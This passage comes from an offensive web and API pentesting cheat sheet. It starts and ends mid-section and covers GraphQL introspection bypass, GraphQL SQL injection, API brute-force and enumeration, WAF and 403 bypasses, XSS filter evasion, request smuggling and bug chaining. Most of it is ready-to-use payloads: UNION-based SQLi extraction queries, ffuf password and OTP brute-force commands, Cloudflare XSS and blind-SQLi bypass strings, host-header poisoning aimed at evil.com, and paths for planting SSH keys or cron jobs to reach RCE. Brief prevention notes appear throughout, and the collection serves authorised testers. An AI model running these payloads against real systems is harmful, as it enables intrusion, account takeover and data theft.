# - Disable introspection in production
# - Restrict sensitive GraphQL operations
# - Use allowlists for queries (persisted queries)
# - Apply authorization at the resolver level, not just endpoint level
```

### GraphQL Schema & Operations (from API Pentesting Blog)

```bash
# Schema defines types, fields, relationships (! = non-nullable/mandatory):
type Product {
    id: ID!
    name: String!
    description: String!
    price: Int
}

# Schemas must include at least one query, and usually mutations too

# Query components: operation type, name, data structure, arguments
query myGetProductQuery {
    getProduct(id: 123) {
        name
        description
    }
}

# Mutation components: operation type, name, input (inline or variable), return
mutation {
    createProduct(name: "Flamin' Cocktail Glasses", listed: "yes") {
        id
        name
        listed
    }
}

# Mutation response:
{
    "data": {
        "createProduct": {
            "id": 123,
            "name": "Flamin' Cocktail Glasses",
            "listed": "yes"
        }
    }
}

# Fields — all GraphQL types contain queryable data items:
query myGetEmployeeQuery {
    getEmployees {
        id
        name {
            firstname
            lastname
        }
    }
}

# Arguments — values for specific fields, defined by schema:
query myGetEmployeeQuery {
    getEmployees(id: 1) {
        name {
            firstname
            lastname
        }
    }
}
# ⚠️ If user-supplied arguments access objects directly → IDOR vulnerability

# Variables — dynamic arguments instead of hardcoding:
query getEmployeeWithVariable($id: ID!) {
    getEmployees(id: $id) {
        name {
            firstname
            lastname
        }
    }
}
# Variables JSON: {"id": 1}
# $id: ID! declares required variable, id: $id uses it, value set in JSON dict
```

### GraphQL Introspection (Enhanced — from API Pentesting Blog)

```bash
# Universal probe (works on ANY GraphQL endpoint):
query{__typename}
# Returns: {"data": {"__typename": "query"}}
# Every GraphQL endpoint has reserved __typename field

# Common endpoint names to probe:
/graphql
/api
/api/graphql
/graphql/api
/graphql/graphql
# Append /v1 if none respond

# Query all supported types:
{
  __schema {
    types {
      name
    }
  }
}

# Query specific type's fields:
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}

# Query all supported queries:
{
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}

# Full introspection query:
query IntrospectionQuery {
    __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types { ...FullType }
        directives {
            name
            description
            args { ...InputValue }
            onOperation  # Often needs to be deleted to run query
            onFragment   # Often needs to be deleted to run query
            onField      # Often needs to be deleted to run query
        }
    }
}

fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
        name
        description
        args { ...InputValue }
        type { ...TypeRef }
        isDeprecated
        deprecationReason
    }
    inputFields { ...InputValue }
    interfaces { ...TypeRef }
    enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
    }
    possibleTypes { ...TypeRef }
}

fragment InputValue on __InputValue {
    name
    description
    type { ...TypeRef }
    defaultValue
}

fragment TypeRef on __Type {
    kind
    name
    ofType {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
            }
        }
    }
}

# NOTE: Remove onOperation, onFragment, onField if query fails
# Many endpoints reject these as part of introspection query

# Visualize results: GraphQL Voyager (https://apis.guru/graphql-voyager/)
# More: https://portswigger.net/burp/documentation/desktop/testing-workflow/working-with-graphql
```

### Bypassing GraphQL Introspection Defenses (from API Pentesting Blog)

```bash
# Bypass regex blocking __schema:
# Insert special character after __schema keyword
# Developers sometimes use regex to block __schema
# Try: spaces, newlines, commas (GraphQL ignores them, flawed regex may not)

# If only __schema{ is excluded:
{"query": "query{__schema\n{queryType{name}}}"}

# Try alternative request methods:
# Introspection may only be disabled over POST
# Try GET, or POST with x-www-form-urlencoded content type

# Rebuilding Schema When Introspection Is Disabled:
# GraphQL servers with field suggestions enabled will correct you:
# "Cannot query field 'pasword' … Did you mean 'password'?"
# Clairvoyance automates this:
pip install clairvoyance
clairvoyance https://target.tld/graphql -o schema.json -w wordlist.txt
# Feed rebuilt schema.json into InQL to generate operations

# Suggestions are a feature of Apollo GraphQL platform
# Clairvoyance uses suggestions to recover schema even when introspection disabled

# Additional resources:
# graphql-wordlist: https://github.com/Escape-Technologies/graphql-wordlist
# Nikita Stupin: https://www.youtube.com/watch?v=nPB8o0cSnvM
# Reference: https://securitycipher.com (Hacking GraphQL APIs in 2026)
```

### GraphQL Rate Limit Bypass via Aliases (from API Pentesting Blog)

```bash
# Aliases let you bypass same-name property restriction
# Useful for returning multiple instances of same object type in one request
# Many endpoints rate-limit based on HTTP requests, not operations
# Aliases send multiple queries in single HTTP message → bypass

# Example checking multiple discount codes:
query isValidDiscount($code: Int) {
    isValidDiscount(code: $code) {
        valid
    }
    isValidDiscount2: isValidDiscount(code: $code) {
        valid
    }
    isValidDiscount3: isValidDiscount(code: $code) {
        valid
    }
}
```

### GraphQL-Based CSRF (from API Pentesting Blog)

```bash
# Arises when endpoint doesn't validate Content-Type and lacks CSRF tokens
# POST with application/json is safe (browser can't forge)
# GET or x-www-form-urlencoded can be sent by browser → CSRF

# Prevention:
# - Only accept queries over JSON-encoded POST
# - Validate that content matches supplied Content-Type
# - Implement secure CSRF token mechanism
```

### SQL Injection in GraphQL (from API Pentesting Blog)

```graphql
# Error-Based Detection
query { user(username: "'") { username } }
query { user(username: "admin'") { username } }
# Look for: SQL syntax errors, database errors, stack traces, unusual behavior

# Comment Testing
# MySQL:
query { user(username: "admin'-- -") { username } }
query { user(username: "admin'#") { username } }
query { user(username: "admin'/*") { username } }
# PostgreSQL:
query { user(username: "admin'--") { username } }
query { user(username: "admin';--") { username } }
# SQL Server:
query { user(username: "admin'--") { username } }
query { user(username: "admin'/*") { username } }

# Boolean-Based Detection
query { user(username: "admin' AND 1=1-- -") { username } }
query { user(username: "admin' AND 1=2-- -") { username } }
# Different responses = SQLi confirmed

# Time-Based Detection
# MySQL:
query { user(username: "admin' AND SLEEP(5)-- -") { username } }
# PostgreSQL:
query { user(username: "admin' AND pg_sleep(5)-- -") { username } }
# SQL Server:
query { user(username: "admin' WAITFOR DELAY '0:0:5'-- -") { username } }
# 5+ second response = SQLi confirmed

# Database Fingerprinting:
query { user(username: "' UNION SELECT 1,2,@@version,4,5,6-- -") { username } }

# Counting Columns:
query { user(username: "admin' ORDER BY 1-- -") { username } }
query { user(username: "admin' UNION SELECT 1-- -") { username } }

# Database Enumeration:
query { user(username: "' UNION SELECT 1,2,database(),4,5,6-- -") { username } }

# Enumerate Tables:
query { user(username: "' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") { username } }
# With LIMIT (if GROUP_CONCAT fails):
query { user(username: "' UNION SELECT 1,2,table_name,4,5,6 FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1-- -") { username } }

# Enumerate Columns:
query { user(username: "' UNION SELECT 1,2,GROUP_CONCAT(column_name),4,5,6 FROM information_schema.columns WHERE table_name='flag'-- -") { username } }

# Check Column Data Types:
query { user(username: "' UNION SELECT 1,2,CONCAT(column_name, ':', data_type),4,5,6 FROM information_schema.columns WHERE table_name='flag'-- -") { username } }

# Data Extraction:
query { user(username: "' UNION SELECT 1,2,flag,4,5,6 FROM flag-- -") { username password role msg } }
query { user(username: "' UNION SELECT 1,2,CONCAT(id, ':', flag),4,5,6 FROM flag-- -") { username } }
query { user(username: "' UNION SELECT 1,2,GROUP_CONCAT(CONCAT(id, ':', flag)),4,5,6 FROM flag-- -") { username } }
```

### PortSwigger Lab Techniques (GraphQL)

```bash
- Accessing private GraphQL posts
- Accidental exposure of private GraphQL fields
- Finding a hidden GraphQL endpoint:
  GET /api?query=query{__typename} HTTP/2
- If introspection disallowed, modify query with newline after __schema:
  __schema%0a+
- Bypassing GraphQL brute-force protections (using aliases)
- Performing CSRF exploits over GraphQL
- Handy tool: GraphiQL Chrome Extension
```

### Preventing GraphQL Attacks (from API Pentesting Blog)

```bash
# - Disable introspection in production (if not public API)
# - If public API: review schema to ensure no unintended fields exposed
# - Disable suggestions (Apollo v4+: hideSchemaDetailsFromClientErrors)
# - Don't expose private fields (emails, user IDs) in schema
# - Only accept JSON-encoded POST
# - Validate Content-Type matches body
# - Implement CSRF tokens
# - Rate limit per OPERATION, not per HTTP request
# More: https://portswigger.net/web-security/graphql
```

### REST API Security

```bash
# Common Issues
- UI restrictions ≠ API security
- Hidden API endpoints in JS files
- Swagger/OpenAPI docs exposed without auth
- Versioned APIs with different auth (v1 vs v2)
- Internal APIs accessible with production cookies
- API keys in query parameters (logged in access logs)
- Missing rate limiting on API endpoints
- Inconsistent auth across endpoints
- Deprecated APIs lack newer auth checks

# Testing
- Monitor all JS files for API endpoints
- Test every endpoint with different roles
- Test with and without auth tokens
- Test parameter tampering on all fields
- Test HTTP method switching (GET → POST → DELETE)
- Test Content-Type switching (JSON → form → XML)
- Test array parameters instead of scalar
- Test duplicate parameters
- Test wildcard in list endpoints (~/, *)
```

### 🔍 API Version Enumeration (Tip #7)

```bash
# Found: /api/v3/
# Also enumerate:
/api/v1/
/api/v2/
/api/v4/
/api/beta/
/api/internal/
/api/legacy/
/api/old/
/api/debug/
/api/admin/
/api/partner/

# Older versions often implement different authorization or validation logic.
# Version drift is worth investigating.

# Why this works:
# - v1 may lack auth checks added in v3
# - v2 may have different rate limits
# - beta may have debug features enabled
# - internal may skip authentication entirely
# - deprecated versions may still be accessible

# Also check:
# - Different base paths: /rest/v1/, /service/v1/, /rpc/v1/
# - Version in header: Accept: application/vnd.api.v1+json
# - Version in parameter: ?version=1&format=json
```

### 🔍 Hidden API Endpoint Method Discovery (Tip #17)

```bash
# Found a hidden API endpoint?
# Don't test just: GET /api/user
# Also check:
OPTIONS /api/user
HEAD /api/user
TRACE /api/user

# The "Allow" header in OPTIONS response may reveal additional HTTP methods:
# Allow: GET, POST, PUT, PATCH, DELETE

# Not a vulnerability by itself, but it helps map the application's attack surface.

# Then test each discovered method:
PUT /api/user      → Can you modify another user?
PATCH /api/user    → Partial update bypass?
DELETE /api/user   → Can you delete without auth?
POST /api/user     → Can you create with elevated role?

# Note: Verify whether exposed methods are actually authorized before reporting.
```

### OWASP API Security Top 10 (2023) (from API Pentesting Blog)

| Risk | Description |
|------|-------------|
| API1:2023 – Broken Object Level Authorization | API allows authenticated users to access data they aren't authorized to view |
| API2:2023 – Broken Authentication | Authentication mechanisms can be bypassed or circumvented |
| API3:2023 – Broken Object Property Level Authorization | API reveals sensitive data beyond scope, or permits manipulation of sensitive properties |
| API4:2023 – Unrestricted Resource Consumption | API doesn't limit resources users can consume |
| API5:2023 – Broken Function Level Authorization | API allows unauthorized users to perform authorized operations |
| API6:2023 – Unrestricted Access to Sensitive Business Flows | API exposes sensitive business flows leading to financial losses |
| API7:2023 – Server Side Request Forgery | API doesn't validate requests, allowing malicious requests to internal resources |
| API8:2023 – Security Misconfiguration | API suffers from misconfigurations including injection vulnerabilities |
| API9:2023 – Improper Inventory Management | API doesn't properly manage version inventory |
| API10:2023 – Unsafe Consumption of APIs | API consumes another API unsafely, introducing security risks |

### OWASP API Top 10 — Practical Examples (from API Pentesting Blog)

```bash
# API1 → Broken Object Level Authorization:
for ((i=1; i<=200; i++)); do
  curl -s -X 'GET' \
    "http://target/api/v1/suppliers/quarterly-reports/$i" \
    -H 'accept: application/json' \
    -H 'Authorization: Bearer <TOKEN>' | jq .
done

# API2 → Broken User Authentication (brute-force):
ffuf -w xato-net-10-million-passwords-10000.txt:PASS -w customerEmails.txt:EMAIL \
  -u http://target/api/v1/authentication/customers/sign-in \
  -X POST -H "Content-Type: application/json" \
  -d '{"Email": "EMAIL", "Password": "PASS"}' \
  -fr "Invalid Credentials" -t 100

# API2 → OTP brute-force:
ffuf -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt \
  -u 'http://target/api/v1/authentication/customers/passwords/resets' \
  -H 'accept: application/json' -H 'Content-Type: application/json' \
  -d '{"Email":"victim@ymail.com","OTP": "FUZZ","NewPassword": "Admin@123123"}' \
  -fr "false"

# API3 → Broken Object Property Level Authorization:
curl -X PATCH http://target/profile \
  -H "Authorization: Bearer <customer_token>" \
  -H "Content-Type: application/json" \
  -d '{"role": "Employee"}'

# API4 → Unrestricted Resource Consumption:
for i in {1..100}; do
  curl -s -X POST \
    "http://target/api/v1/authentication/customers/passwords/resets/sms-otps" \
    -H "accept: application/json" \
    -H "Content-Type: application/json" \
    -d '{"Email":"string"}'
done

# API5 → Broken Function Level Authorization:
# Key difference from BOLA: user isn't authorized to invoke endpoint AT ALL
# Example: /api/v1/products/discounts requires ProductDiscounts_GetAll role
# Test: access with customer JWT → if successful, BFLA confirmed

# API8 → Security Misconfiguration (SQLi):
curl -X 'GET' \
  'http://target/api/v1/products/laptop%27%20OR%201%3D1%20--/count' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer <TOKEN>'
# Also: improper CORS (Access-Control-Allow-Origin) → CSRF risk

# API9 → Improper Inventory Management:
# Outdated/incompatible API versions remaining accessible
# Maintain accurate documentation, proper versioning

# API10 → Unsafe Consumption of APIs:
# Critical risks from API-to-API communication:
# - Insecure Data Transmission (unencrypted channels)
# - Inadequate Data Validation (injection, data corruption, RCE)
# - Weak Authentication (unauthorized inter-API access)
# - Insufficient Rate-Limiting (DoS between APIs)
# - Inadequate Monitoring (harder to detect incidents)
```

### Preventing API Vulnerabilities (from API Pentesting Blog)

```bash
# When designing APIs, build security in from the start:
# - Secure documentation if API isn't meant to be public
# - Keep documentation accurate and up to date
# - Apply allowlist of permitted HTTP methods
# - Validate Content-Type is expected for every request/response
# - Use generic error messages (avoid info leakage)
# - Apply protective measures across ALL API versions
# - Allowlist properties users can update, blocklist sensitive ones (mass assignment)
```

---

## 14. WAF & FILTER BYPASS MASTER LIST

| Technique | Example |
|-----------|---------|
| Uncommon event handlers | `onauxclick`, `onanimationend`, `onmouseover` + `autofocus` |
| HTML comment prefix | `<!--><svg/onload=...>` |
| Backtick execution | `` zz`;(alert)();`// `` |
| Unicode fullwidth | `＜script＞` |
| Homoglyphs | Cherokee `Ꮇ`, Cyrillic `а` |
| Entity encoding | `&#34;&#62;&#60;img...` |
| CRLF/CR-only | `%0d%0a`, bare `\r` as delimiter |
| Hex escapes in rules | `\x0a\x0d` in Cloudflare concat |
| Null bytes | `%00` truncation |
| Double URL encoding | `%2520onmouseover` |
| Path normalization | `//`, `/..;/`, `\` vs `/`, `/.?` |
| Parameter pollution | `trusted=0&trusted=1`, duplicate `screen_name` |
| Array smuggling | `user[email][]=a&user[email][]=b` |
| Content-Type switch | JSON→form, text/plain |
| Method manipulation | GET→POST→DELETE |
| IP spoofing headers | `X-Forwarded-For: 127.0.0.1` |
| Host header | `Host: internal` on shared IP |
| Case variation | `Action` vs `action`, `co.UK` PSL |
| Wildcard bypass | `--allow-fs-read=/x/*.pub` reads all |
| MySQL truncation | 128-char email / `𝌆` U+10000 |
| JSON React spoofing | `{"_isReactElement":true,...dangerouslySetInnerHTML}` |
| CORS origin indexOf | `https://legit.com.attacker.com` |
| Referer-based checks | `{` or `}` in domain (Safari) |
| Request gating / single-packet | Turbo Intruder race |
| SVG entity whitelist disable | `<!DOCTYPE svg [<!ENTITY elem "">]>` |
| Markdown backslash escape | `<http://\<img\ onerror=alert(1)\>>` |
| BBCode URL injection | `[url=google.com:/onclick='alert(1)'[url=]]xss[/url]` |
| CSS expression (IE) | `style="width:expression(alert(1))"` |
| AngularJS sandbox escape | `{{constructor.constructor('alert(1)')()}}` |
| Prototype pollution | `?__proto__.innerHTML=<iframe srcdoc=...>` |
| postMessage File object | `new File([""], "<img src=xx: onerror=alert(1)>")` |

### 🔓 403 Bypass Techniques (Tips #4, #19, #54)

```bash
# One of the best 403 bypass payloads (Tip #54):
- X-Forwarded-For: 127.0.0.1
- /dir/..;/dir/
- Host: localhost
- /admin → /Admin
- /file/../file

# Path-based bypasses (Tip #19):
/admin/
/administrator/
/admin.php
/admin/login
/dashboard
/manage
/admin/../admin
//admin/
/Admin/
/admin;/
/Admin;/
/index.php/admin/
/admin/js/*.js
/admin../admin
//anything/admin/
/admin%20/
/admin%09/
/admin..;/
/%61dmin/
/admin./
/./admin/

# Header-based bypasses:
X-Forwarded-For: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-Host: localhost
X-Host: localhost
X-Remote-Addr: 127.0.0.1

# Method-based bypasses:
GET /admin → POST /admin
GET /admin → PUT /admin
GET /admin → OPTIONS /admin
GET /admin → HEAD /admin
GET /admin → TRACE /admin
POST /admin + X-HTTP-Method-Override: GET

# A 403 often indicates the resource EXISTS but access is denied.
# Sometimes older or alternate routes have different access controls.
# ⚠️ This doesn't guarantee a vulnerability - always verify.
```

### 🔓 HTTP Parameter Pollution (Tips #15, #25, #44)

```bash
# Application validates: role=user
# Try testing duplicate parameters: role=user&role=admin

# Different frameworks handle duplicates differently:
# Some use: First value (PHP/Apache)
# Some use: Last value (ASP.NET/IIS, Node.js)
# Some use: Merge both (Java Servlets)
# Some use: Array of all values

# POC - Authorization Bypass (Tip #25):
# 1. Intercepted request containing role=user
# 2. Added second parameter role=admin
# 3. Backend processed the last value
# 4. Accessed admin-only functionality

# POC - Access Control Bypass (Tip #44):
# 1. Sent request with duplicate parameter role=user&role=admin
# 2. Backend parsed second value
# 3. Authorization logic used manipulated role
# 4. Gained admin-level access

# Testing:
?id=1&id=2
?role=user&role=admin
?admin=false&admin=true
?debug=0&debug=1

# Also test in different locations:
# URL: ?role=user + Body: role=admin
# URL: ?role=user + Header: X-Role: admin
# Cookie: role=user + Body: role=admin

# Note: Duplicate parameters alone aren't a vulnerability -
# look for a SECURITY IMPACT.

# Learning:
# - Reject duplicate parameters
# - Use strict parameter parsing on the server
# - Document which value takes precedence
```

### 🔓 Fat GET / Parameter Pollution (Tip #77)

```bash
# Technique: Overriding URL parameters with body parameters in GET requests.
# Payloads:
GET /api/reset_password?token=valid_token
Content-Type: application/x-www-form-urlencoded
token=invalid_token

# The backend may prioritize the body parameter over the URL parameter,
# bypassing token validation logic.

# Also test:
# GET with JSON body
# GET with multipart body
# POST with URL parameters (reversed)
# Parameters in both URL and body with different values

# Philosophy: Test how the backend prioritizes parameters when supplied
# in multiple locations (URL, body, headers, cookies).
```

### 🔓 HTTP Method Override → Auth Bypass (Tip #42)

```bash
# POC:
# 1. Found endpoint allowed only GET
# 2. Sent request with POST + _method=GET
# 3. Backend processed it as valid request
# 4. Accessed restricted functionality

# Method override techniques:
POST /admin HTTP/1.1
X-HTTP-Method-Override: GET

POST /admin HTTP/1.1
X-HTTP-Method: GET

POST /admin HTTP/1.1
X-Method-Override: GET

POST /admin?_method=GET HTTP/1.1

POST /admin HTTP/1.1
_method=GET (in body)

# Also try:
# PUT with X-HTTP-Method-Override: DELETE
# POST with X-HTTP-Method-Override: PATCH
# Any method with override to TRACE/OPTIONS

# Philosophy: WAFs and backend servers often parse HTTP methods differently;
# misalignment creates bypasses.
```

### 🔓 WAF Bypass via HTTP Verb Tampering (Tip #78)

```bash
# Technique: Changing HTTP methods to bypass access controls or firewall rules.
# Payloads:
# Changed GET /admin (blocked) to:
POST /admin
PUT /admin
PATCH /admin
DELETE /admin
OPTIONS /admin
HEAD /admin
TRACE /admin
CONNECT /admin

# With override headers:
POST /admin + X-HTTP-Method-Override: GET
PUT /admin + X-HTTP-Method-Override: GET

# Also test:
# Custom methods: JEFF /admin, CATS /admin
# Lowercase: get /admin
# Mixed case: GeT /admin
# With trailing spaces: GET /admin%20
# HTTP/1.0 vs HTTP/1.1

# Philosophy: WAFs and backend servers often parse HTTP methods differently;
# misalignment creates bypasses.
```

### 🔓 Cloudflare WAF Bypass - XSS (Tips #52, #55, #57)

```html
<!-- HTML Sanitizer Bypass (Tip #52): -->
'<00 foo="<a%20href="javascript:alert('XSS-Bypass')">XSS-CLick</00>--%20/

<!-- Cloudflare WAF Bypass (Tips #55, #57): -->
%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
<!-- Decoded: <SVG/oNlY=1 ONlOAD=confirm(document.domain)> -->

<!-- Key techniques: -->
<!-- - Case randomization: oNlY, ONlOAD -->
<!-- - URL encoding: %3C for <, %3E for > -->
<!-- - Uncommon attributes: oNlY=1 -->
<!-- - Mixed encoding levels -->

<!-- Additional Cloudflare bypasses (Tip #53): -->
"><?/script>"><--<img+src= "><svg/onload?=alert(document.cookie)>> --!>
"-->""/>0xr3dhunt</script><deTailS open x=">" ontoggle=(co\u006efirm)``>"
"-->""/>0xr3dhunt</script><deTailS open x=">" ontoggle=(co\u006efirm(document.cookie))``>"

<!-- Techniques used: -->
<!-- - Unicode escapes: \u006efirm = confirm -->
<!-- - Backtick execution: `` -->
<!-- - HTML comment breakouts: --> -->
<!-- - Tag confusion: deTailS -->
<!-- - Attribute injection: x=">" -->
```

### 🔓 Cloudflare 403 Bypass to Blind SQLi (Tip #62)

```bash
# Blocked payload:
(select(0)from(select(sleep(10)))v) → 403

# Bypass payload:
(select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'%5C"%2B(select(0)from(select(sleep(6)))v → Time-based Blind SQLi

# Key insight: The WAF blocks sleep(10) but allows sleep(6)
# when wrapped in comment/multi-context syntax.

# Techniques:
# - Reduce sleep time below WAF threshold
# - Use SQL comments to break pattern matching
# - Multiple contexts: ' + " + \
# - URL encoding: %2B (+), %5C (\)
```

### 🔓 Header Bypass Collection (Tip #35)

```bash
# IP-based access control bypasses:
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
Client-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Host: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Remote-Addr: 127.0.0.1
True-Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1
CF-Connecting-IP: 127.0.0.1

# Also try internal IPs:
X-Forwarded-For: 10.0.0.1
X-Forwarded-For: 192.168.1.1
X-Forwarded-For: 172.16.0.1
```

### 🔓 API-Specific WAF Bypass Techniques (from API Pentesting Blog)

```bash
# === CASE SWITCHING FOR RATE LIMIT BYPASS ===
# Some security controls key off literal spelling/case:
POST /api/myprofile    (rate limited)
POST /api/MyProfile    (may reset quota)
POST /api/MYPROFILE    (may bypass entirely)
POST /aPi/MypRoFiLe   (may bypass entirely)
# Use Burp Pitchfork to pair case variants with payload ranges

# === DOUBLE URL ENCODING ===
# If provider decodes only once:
# WAF sees: %25%32%37... (not SQL injection pattern)
# Backend decodes: %27%20%4f%52... → ' OR 1=1;
# WAF misses, backend processes correctly

# === NULL BYTE STRING TERMINATORS ===
# Place before payload to terminate security filter processing:
%00  0x00  //  ;  %  !  ?  []  %5B%5D
%09  %0a  %0b  %0c  %0e
# Example: {"pass":"%00'OR 1=1"} → null byte bypasses validation

# === WFUZZ ENCODING CHAINS ===
wfuzz -e encoders                     # list available
wfuzz -z file,wordlist.txt,base64     # single encoder
wfuzz -z list,TEST,base64-md5-none    # chained encoders
# Available: base64, urlencode, random_upper, md5, hexlify, none

# === BURP PAYLOAD PROCESSING ===
# Under Intruder → Payload Processing:
# Add rules: prefix, suffix, URL-encode, hash, match-and-replace
# Order: encode FIRST, then add null bytes (so they aren't encoded)
# Rules applied top-to-bottom
```

---

## 15. SERVER INTERACTION TECHNIQUES

### Header Manipulation

```bash
X-Forwarded-For: 127.0.0.1          # IP bypass
X-Forwarded-Host: evil.com          # cache poisoning / redirect
X-Forwarded-Port: 123               # DoS cache poison
X-Original-URL: /admin              # path override
X-Rewrite-URL: /admin
Host: internal.domain               # vhost routing / token leak
```

### 🔓 Host Header Testing (Tip #10)

```bash
# Whenever you see absolute URLs in responses,
# test whether they depend on:
# - Host
# - X-Forwarded-Host
# - Forwarded

# Improper trust in these headers can affect:
# • Password reset links (redirect to attacker domain)
# • Email generation (links point to attacker)
# • Redirects (open redirect via Host)
# • Cache keys (cache poisoning)

# Testing:
curl -H "Host: evil.com" https://target.com/password-reset
curl -H "X-Forwarded-Host: evil.com" https://target.com/password-reset
curl -H "Forwarded: host=evil.com" https://target.com/password-reset

# Check if the response contains:
# <a href="https://evil.com/reset?token=...">
# If yes → Host header injection → password reset poisoning

# Context determines impact:
# - On password reset → ATO
# - On cached pages → cache poisoning
# - On OAuth flows → token theft
# - On email templates → phishing
```

### HTTP Smuggling

```bash
# CL.TE / TE.CL
Mismatched front/back Content-Length vs Transfer-Encoding

# Bare CR delimiter
X-Abc:\rxTransfer-Encoding: chunked

# Oversized trailer
Chunked POST with 8190+ char trailer → IOException → boundary confusion

# Incomplete POST
Content-Length > actual body → error response leaks prior user data

# Pause-based
Body discard errors → desync

# HTTP/2 CONTINUATION flood
HEADERS + 8 CONTINUATION frames × ~100 headers → OOM

# WEBrick regex bypass
Transfer-Encoding: AAAchunkedBBB matches /chunked/io
```

### 🔓 HTTP/2 Request Smuggling → Authentication Bypass (Tip #22)

```bash
# POC:
# 1. Found application using HTTP/2 behind a proxy
# 2. Crafted ambiguous HTTP/2 request
# 3. Proxy and backend parsed it differently
# 4. Bypassed authentication controls

# Testing:
# - Test HTTP/1.1 and HTTP/2 behavior separately
# - Look for proxy/backend parsing differences
# - Try H2C (HTTP/2 cleartext) upgrade smuggling
# - Test CONTINUATION frame injection
# - Check if pseudo-headers (:method, :path) are validated

# Common H2 smuggling vectors:
# - Inject \r\n in header values (H2 allows, H1 interprets as delimiter)
# - Use :authority pseudo-header vs Host header mismatch
# - CONTENT_LENGTH vs content-length (case sensitivity)
# - Transfer-Encoding in H2 (should be rejected, sometimes isn't)

# Learning:
# - Test HTTP/1.1 and HTTP/2 behavior separately
# - Look for proxy/backend parsing differences
# - Normalize headers before forwarding
```

### Cache Attacks

```bash
# Poisoning
- X-Forwarded-Host reflected in cached HTML/JS
- Backslash path 404 poison
- Query string sorting reorder
- Amazon affiliate ../ path traversal
- X-Forwarded-Port → redirect poison

# Deception
- HTTP/2 response ordering → search result existence oracle
- Set-Cookie caching: ActiveStorage public + cookie leak
```

### Protocol-Level

```bash
# XXE
- External DTD exfiltration
- SVG xlink:href
- DOCX/XLSX embedded XML
- XInclude for file read

# SSTI/Template
- Jinja {{7*7}}
- Liquid {{methods}}
- Rails t(".x_html", default: user_input)

# SMTP
- Open relay on port 587
- Bounce message XSS (Postfix REJECT with HTML)
- StartTLS stripping (Python smtplib)
- DKIM stripping by forwarding services
```

---

## 16. ADVANCED CHAINING

### Chaining Philosophy

> **Low + Low = Critical. No bug is "low" if it unlocks the next one.**

### 🔗 Self-XSS → Account Takeover Chain (Tip #21)

```bash
# POC:
# 1. Found a Self-XSS in the user profile page
# 2. Combined it with a CSRF/social engineering trick
# 3. Victim executed the payload while logged in
# 4. Session token or sensitive actions were compromised

# Chaining methods:
# - Self-XSS + Login CSRF → victim logs into attacker's account → XSS fires
# - Self-XSS + CSRF on profile update → change victim's bio to XSS payload
# - Self-XSS + Social engineering → "paste this code in your console"
# - Self-XSS + Open redirect → redirect to profile page with XSS in URL

# Learning:
# - Don't ignore Self-XSS during testing
# - Look for ways to chain low-impact bugs into higher-impact exploits
# - Self-XSS + any way to execute in victim's context = stored XSS
```

### 🔗 Open Redirect → OAuth Token Theft (Tip #30)

```bash
# POC:
# 1. Found vulnerable redirect_url parameter
# 2. Changed it to attacker-controlled domain
# 3. User completed OAuth login flow
# 4. Access token leaked via redirect

# Chain:
# Open redirect on trusted.com → OAuth redirect_uri=https://trusted.com/redirect?url=https://evil.com
# → OAuth provider sees trusted.com (allowed) → redirects with token
# → trusted.com redirects to evil.com → token leaked

# Learning:
# - Validate redirect URLs strictly (exact match allowlist)
# - Never expose tokens in query parameters
# - Use PKCE for OAuth flows
# - Check Referer header leakage on redirect pages
```

### 🔗 XSS to LFI (Tip #48)

```html
<!-- Payload: -->
<img src="echopwn" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>

<!-- Root Idea: -->
<!-- 1. XSS payload uses an <img> tag with a broken src -->
<!-- 2. The onerror event triggers JavaScript execution -->
<!-- 3. JavaScript writes an <iframe> into the page -->
<!-- 4. The iframe loads a local file (file:///etc/passwd), attempting LFI via XSS -->

<!-- When this works: -->
<!-- - Electron apps (file:// protocol enabled) -->
<!-- - Android WebView (file:// access) -->
<!-- - Local HTML files -->
<!-- - Applications with file:// protocol handler -->

<!-- Also try: -->
<!-- - file:///etc/shadow -->
<!-- - file:///proc/self/environ -->
<!-- - file:///C:/Windows/system32/drivers/etc/hosts -->
<!-- - file:///data/data/com.app/shared_prefs/ -->
```

### 🔗 Limited Path Traversal to RCE (Tip #63)

```bash
# Technique: Chained limited file-write to overwrite sensitive OS files.
# Payloads:
# Bypassed path filters using:
....//
%2e%2e%2f
..%5c
..%252f

# Target files for overwrite:
/root/.ssh/authorized_keys     → SSH key injection → RCE
/var/spool/cron/crontabs/root  → Cron job injection → RCE
/etc/cron.d/malicious          → Cron job injection → RCE
/var/www/html/shell.php        → Web shell → RCE
/home/user/.bashrc             → Command execution on login
/etc/ld.so.preload             → Library preload → RCE

# Philosophy: Never dismiss a limited bug; chain it to maximize impact.
# LFI/File Write → RCE is a classic escalation path.
```

### 🔗 Chaining Bugs for Infrastructure Takeover (Tip #64)

```bash
# Technique: Found Open Redirect → Chained into SSRF → Accessed cloud metadata.
# Chain:
# 1. Open redirect: https://target.com/redirect?url=http://169.254.169.254/latest/meta-data/
# 2. SSRF via redirect: server follows redirect to metadata endpoint
# 3. Cloud metadata: extract IAM credentials
# 4. Infrastructure takeover: use credentials for cloud API access

# Redirect payloads pointing to cloud metadata:
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1beta1/
http://100.100.100.200/latest/meta-data/

# Philosophy: Quality over quantity. Don't chase hundreds of low-hanging fruit;
# chain low-severity bugs to own the whole cloud infrastructure.
```

### 🔗 CSRF to Account Takeover (Tip #72)

```html
<!-- Technique: Cross-Site Request Forgery on critical account actions (email change). -->
